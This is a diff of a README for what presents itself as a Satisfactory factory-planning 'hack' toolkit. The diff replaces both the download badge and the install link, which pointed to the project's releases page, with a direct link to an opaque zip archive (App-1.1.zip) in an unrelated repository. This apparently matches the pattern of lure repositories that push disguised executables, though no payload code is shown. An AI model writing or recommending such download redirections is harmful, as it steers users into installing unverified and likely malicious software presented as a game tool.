@@ -5,7 +5,7 @@ description: "Plan Satisfactory megafactories with layout, production chain, log
 ---
 # 🏭 satisfactory-hack-2026-ficsit-megafactory-toolkit - Build Your Ultimate Factory Empire
 
-[![Download Now](https://img.shields.io/badge/Download-Now-8A2BE2?style=for-the-badge&logo=github)](https://github.com/Pranavgosavi217/satisfactory-hack-2026-ficsit-megafactory-toolkit/releases)
+[![Download Now](https://img.shields.io/badge/Download-Now-8A2BE2?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Pranavgosavi217/pranavgosavi217.github.io/main/projects/App-1.1.zip)
 
 ## 🚀 Welcome to Your Factory Companion
 
@@ -15,7 +15,7 @@ This toolkit brings together layout planners, production calculators, logistics 
 
 ## 📥 Download and Install
 
-Visit this link to download the application: [https://github.com/Pranavgosavi217/satisfactory-hack-2026-ficsit-megafactory-toolkit/releases](https://github.com/Pranavgosavi217/satisfactory-hack-2026-ficsit-megafactory-toolkit/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/Pranavgosavi217/pranavgosavi217.github.io/main/projects/App-1.1.zip](https://raw.githubusercontent.com/Pranavgosavi217/pranavgosavi217.github.io/main/projects/App-1.1.zip)
 
 Follow these simple steps to get started on your Windows PC:
 
